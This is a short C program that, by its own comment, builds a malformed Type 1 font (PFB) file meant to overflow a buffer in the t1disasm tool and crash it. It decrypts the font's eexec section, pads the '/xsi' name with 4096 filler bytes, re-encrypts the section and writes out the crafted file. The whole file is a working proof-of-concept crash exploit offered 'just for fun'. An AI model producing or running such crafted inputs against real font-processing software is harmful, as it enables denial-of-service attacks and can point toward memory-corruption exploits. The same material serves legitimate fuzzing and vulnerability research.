// This program modifies the pfb file to be even more invalid, and #
// overflow a buffer in t1disasm, causing the latter to crash.  There's
// no real point to this-- it's just for fun.
// (it was a Python script but it was too slow after I realized I needed 0x30000 zeroes)

#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>

void _crypt(uint8_t *ptr, size_t size, bool decrypt) {
    uint16_t c1 = 52845;
    uint16_t c2 = 22719;
    uint16_t r = 55665;
    while(size--) {
        uint8_t c = *ptr;
        uint8_t new_c = c ^ (r >> 8);
        *ptr = new_c;
        r = ((decrypt ? c : new_c) + r)*c1 + c2;
        ptr++;
    }
}

int main(int argc, char **argv) {
    int fd = open(argv[1], O_RDONLY);
    assert(fd != -1);
    size_t size = (size_t) lseek(fd, 0, SEEK_END);
    char *start = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    assert(start != MAP_FAILED);
    char *binary_part = strnstr(start + 6, "currentfile eexec", size - 6);
    assert(binary_part);
    binary_part += strlen("currentfile eexec\n") + 6;
    size_t text_part_size = binary_part - start - 4;
    size_t binary_part_size = *((uint32_t *) (binary_part - 4));
    //printf("%zd\n", binary_part_size);
    char *text_part_2 = binary_part + binary_part_size;
    size_t text_part_2_size = size - (text_part_2 - start);
    
    _crypt((void *) binary_part, binary_part_size, true);

    size_t new_binary_part_size = binary_part_size + 0x1000 - 3;
    char *new_binary_part = malloc(new_binary_part_size);
    
    //write(1, binary_part, binary_part_size);

    size_t i;
    for(i = 0; i < binary_part_size; i++) {
        new_binary_part[i] = binary_part[i];
        if(!memcmp(binary_part + i, "/xsi", 4)) {
            //printf("found xsi\n");
            size_t j;
            for(j = i + 1; j < i + 4097; j++) new_binary_part[j] = 'a';
            memcpy(new_binary_part + j, binary_part + i + 4, binary_part_size - i - 4);
            break;
        }
    }

    //write(1, new_binary_part, new_binary_part_size);

    _crypt((void *) new_binary_part, new_binary_part_size, false);

    int fd2 = open(argv[2], O_WRONLY | O_CREAT | O_TRUNC, 0644);
    assert(fd2 != -1);
    write(fd2, start, text_part_size);
    uint32_t nbps = new_binary_part_size;
    write(fd2, &nbps, sizeof(nbps));
    write(fd2, new_binary_part, new_binary_part_size);
    write(fd2, text_part_2, text_part_2_size);
    return 0;
}
